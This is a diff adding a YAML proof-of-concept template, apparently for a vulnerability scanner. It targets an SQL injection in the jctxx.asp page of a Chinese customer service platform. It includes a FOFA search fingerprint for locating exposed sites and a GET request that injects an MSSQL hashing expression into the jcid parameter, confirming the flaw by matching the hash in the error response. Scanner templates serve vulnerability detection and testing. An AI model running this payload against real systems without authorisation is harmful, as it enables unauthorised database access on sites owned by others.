@@ -1,0 +1,17 @@
+id: poc-yaml-yingsaite-icsp-jctxx-asp-sqli
+info:
+  name: 英赛特互联网客户服务平台 jctxx.asp SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 英赛特互联网客户服务平台
+  fofa: body="英赛特互联网客户服务平台"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /csccmise/jctxx.asp?jcid=sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}'))
+  expression: status_code == 500 && contains(body,"0x" + t2) && contains(body,"SQL")
+    && contains(body,"ODBC") && contains(body,"/csccmise/jctxx.asp")
+transport: http
